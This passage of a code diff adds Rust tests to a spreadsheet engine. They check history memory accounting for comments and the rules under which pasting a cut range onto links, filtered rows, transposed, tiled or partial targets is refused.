+    let out = s.execute("data.circleInvalid", json!({})).unwrap();
+    assert_eq!(out["truncated"].as_bool(), Some(true), "{out}");
+}
+
+#[test]
+fn history_charges_a_changed_sheets_comment_text() {
+    let mut s = s();
+    s.execute("review.newNote", json!({"cell": "A1", "text": "n".repeat(30_000), "author": "Example"})).unwrap();
+    let older = (*s.doc().unwrap().wb).clone();
+    s.execute("cell.set", json!({"cell": "B2", "input": "x"})).unwrap();
+    let newer = (*s.doc().unwrap().wb).clone();
+    // The older snapshot owns the comment text now that the sheet changed under it.
+    assert!(crate::history_retained_bytes(&older, &newer) >= 30_000);
+}
+
+#[test]
+fn history_charges_the_storage_of_empty_comment_replies() {
+    let mut s = s();
+    s.execute("review.newComment", json!({"cell": "A1", "text": "c", "author": "Ann"})).unwrap();
+    for _ in 0..500 {
+        s.execute("review.replyComment", json!({"cell": "A1", "text": "", "author": ""})).unwrap();
+    }
+    let sheet = s.doc().unwrap().wb.sheet(0).unwrap().clone();
+    // 500 replies of no text are still 500 elements.
+    assert!(crate::sheet_text_bytes(&sheet) >= 500 * std::mem::size_of::<(String, String)>());
+}
+
+/// Paste Link would write links to the cells a cut empties, losing them: a cut can't be pasted
+/// as links, and nothing changes.
+#[test]
+fn a_cut_is_not_pasted_as_links() {
+    let mut s = s();
+    s.execute("range.setValues", json!({"range": "A1", "values": [[1, 2]]})).unwrap();
+    s.execute("edit.cut", json!({"range": "A1:B1"})).unwrap();
+    assert!(s.execute("edit.pasteSpecial", json!({"what": "all", "link": true, "at": "E1"})).is_err());
+    assert_eq!((v(&s, "A1"), v(&s, "B1"), v(&s, "E1")), (Value::Number(1.0), Value::Number(2.0), Value::Empty));
+}
+
+/// A cut pasted into a row the filter hides would skip every cell it writes, so the cells would
+/// leave the sheet with the cut: it is refused and nothing changes. A visible row takes it.
+#[test]
+fn a_cut_is_not_pasted_into_filtered_rows() {
+    let mut s = s();
+    let mut rows = vec![json!(["Val", "Tag"])];
+    for i in 2..=5 {
+        rows.push(json!([format!("v{i}"), if i == 3 { "hide" } else { "keep" }]));
+    }
+    s.execute("range.setValues", json!({"range": "A1", "values": rows})).unwrap();
+    s.execute("range.setValues", json!({"range": "E1", "values": [[1, 2]]})).unwrap();
+    s.execute("selection.set", json!({"range": "A1:B1"})).unwrap();
+    s.execute("data.filter", json!({})).unwrap();
+    s.execute("data.filterBy", json!({"column": "B", "values": ["keep"]})).unwrap();
+    s.execute("edit.cut", json!({"range": "E1:F1"})).unwrap();
+    s.execute("selection.set", json!({"range": "A3:B3"})).unwrap();
+    assert!(s.execute("edit.paste", json!({})).is_err());
+    assert_eq!((v(&s, "E1"), v(&s, "F1")), (Value::Number(1.0), Value::Number(2.0)));
+    assert_eq!(v(&s, "A3"), Value::from("v3"));
+    s.execute("selection.set", json!({"range": "A4:B4"})).unwrap();
+    s.execute("edit.paste", json!({})).unwrap();
+    assert_eq!((v(&s, "A4"), v(&s, "B4"), v(&s, "E1")), (Value::Number(1.0), Value::Number(2.0), Value::Empty));
+}
+
+/// A taller cut, or one pasted at an explicit cell, goes straight down: refused when a row the
+/// filter hides is among the rows it would land on, and nothing changes. A visible place takes it.
+#[test]
+fn an_anchored_cut_is_not_pasted_over_filtered_rows() {
+    let mut s = s();
+    let mut rows = vec![json!(["Val", "Tag"])];
+    for i in 2..=5 {
+        rows.push(json!([format!("v{i}"), if i == 3 { "hide" } else { "keep" }]));
+    }
+    s.execute("range.setValues", json!({"range": "A1", "values": rows})).unwrap();
+    s.execute("range.setValues", json!({"range": "A10", "values": [[1, 2], [3, 4]]})).unwrap();
+    s.execute("selection.set", json!({"range": "A1:B1"})).unwrap();
+    s.execute("data.filter", json!({})).unwrap();
+    s.execute("data.filterBy", json!({"column": "B", "values": ["keep"]})).unwrap();
+    s.execute("edit.cut", json!({"range": "A10:B11"})).unwrap();
+    assert!(s.execute("edit.paste", json!({"at": "A2"})).is_err());
+    assert_eq!((v(&s, "A10"), v(&s, "B11")), (Value::Number(1.0), Value::Number(4.0)));
+    assert_eq!((v(&s, "A2"), v(&s, "A3")), (Value::from("v2"), Value::from("v3")));
+    s.execute("edit.paste", json!({"at": "A4"})).unwrap();
+    assert_eq!((v(&s, "A4"), v(&s, "B5"), v(&s, "A10")), (Value::Number(1.0), Value::Number(4.0), Value::Empty));
+}
+
+/// Skip Blanks would empty a cut's blank cells along with their note and format, then skip them:
+/// a cut takes no Paste Special option, and nothing changes.
+#[test]
+fn a_cut_is_not_pasted_skipping_blanks() {
+    let mut s = s();
+    s.execute("range.setValues", json!({"range": "A1", "values": [[1]]})).unwrap();
+    s.execute("review.newNote", json!({"cell": "B1", "text": "note", "author": "Example"})).unwrap();
+    s.execute("home.bold", json!({"range": "B1"})).unwrap();
+    s.execute("edit.cut", json!({"range": "A1:B1"})).unwrap();
+    assert!(s.execute("edit.pasteSpecial", json!({"what": "all", "skipBlanks": true, "at": "E1"})).is_err());
+    let d = s.doc().unwrap();
+    let sh = d.wb.active().unwrap();
+    let b1 = CellRef::parse("B1").unwrap();
+    assert!(sh.comments.contains_key(&b1));
+    assert!(d.wb.styles.get(sh.style_id(b1)).font.bold);
+    assert_eq!((v(&s, "A1"), v(&s, "E1")), (Value::Number(1.0), Value::Empty));
+}
+
+/// Transposing a cut would move references to it as if it were not transposed: refused, and a
+/// formula reading the cut cells still reads them.
+#[test]
+fn a_cut_is_not_pasted_transposed() {
+    let mut s = s();
+    s.execute("range.setValues", json!({"range": "A1", "values": [[1, 2]]})).unwrap();
+    s.execute("cell.set", json!({"cell": "H1", "input": "=B1"})).unwrap();
+    s.execute("edit.cut", json!({"range": "A1:B1"})).unwrap();
+    assert!(s.execute("edit.pasteSpecial", json!({"what": "all", "transpose": true, "at": "E5"})).is_err());
+    assert_eq!(formula_at(&s, "H1").as_deref(), Some("B1"));
+    assert_eq!((v(&s, "A1"), v(&s, "B1"), v(&s, "E5"), v(&s, "E6")), (Value::Number(1.0), Value::Number(2.0), Value::Empty, Value::Empty));
+}
+
+/// A cut lands in one place: onto a larger or differently shaped selection it is refused, as in
+/// Excel, rather than tiled.
+#[test]
+fn a_cut_is_not_pasted_over_a_larger_area() {
+    let mut s = s();
+    s.execute("range.setValues", json!({"range": "A1", "values": [[5]]})).unwrap();
+    s.execute("edit.cut", json!({"range": "A1"})).unwrap();
+    s.execute("selection.set", json!({"range": "E1:E3"})).unwrap();
+    assert!(s.execute("edit.paste", json!({})).is_err());
+    assert_eq!((v(&s, "A1"), v(&s, "E1"), v(&s, "E2"), v(&s, "E3")), (Value::Number(5.0), Value::Empty, Value::Empty, Value::Empty));
+}
+
+/// A paste operation or a partial paste (values only) of a cut would empty the cut cells and
+/// combine or keep only part of them: refused, and nothing changes.
+#[test]
+fn a_cut_is_not_pasted_with_an_operation_or_in_part() {
+    let mut s = s();
+    s.execute("range.setValues", json!({"range": "A1", "values": [[5]]})).unwrap();
+    s.execute("range.setValues", json!({"range": "E1", "values": [[2]]})).unwrap();
+    s.execute("edit.cut", json!({"range": "A1"})).unwrap();
+    assert!(s.execute("edit.pasteSpecial", json!({"what": "all", "operation": "add", "at": "E1"})).is_err());
+    assert!(s.execute("edit.pasteSpecial", json!({"what": "values", "at": "E1"})).is_err());
+    assert_eq!((v(&s, "A1"), v(&s, "E1")), (Value::Number(5.0), Value::Number(2.0)));
+}
+
+/// A refused paste leaves the cut pending: a plain Paste onto one cell, or onto an area of the cut's
+/// size, still moves it.
+#[test]
+fn a_refused_cut_paste_leaves_the_cut_to_paste_plainly() {
+    let mut s = s();
+    s.execute("range.setValues", json!({"range": "A1", "values": [[1, 2]]})).unwrap();
+    s.execute("edit.cut", json!({"range": "A1:B1"})).unwrap();
+    assert!(s.execute("edit.pasteSpecial", json!({"what": "all", "transpose": true, "at": "E5"})).is_err());
+    s.execute("selection.set", json!({"range": "E1"})).unwrap();
+    s.execute("edit.paste", json!({})).unwrap();
+    assert_eq!((v(&s, "A1"), v(&s, "E1"), v(&s, "F1")), (Value::Empty, Value::Number(1.0), Value::Number(2.0)));
+    assert!(s.clipboard.is_none());
+    s.execute("edit.cut", json!({"range": "E1:F1"})).unwrap();
+    s.execute("selection.set", json!({"range": "C3:D3"})).unwrap();
+    s.execute("edit.paste", json!({})).unwrap();
+    assert_eq!((v(&s, "E1"), v(&s, "C3"), v(&s, "D3")), (Value::Empty, Value::Number(1.0), Value::Number(2.0)));
 }
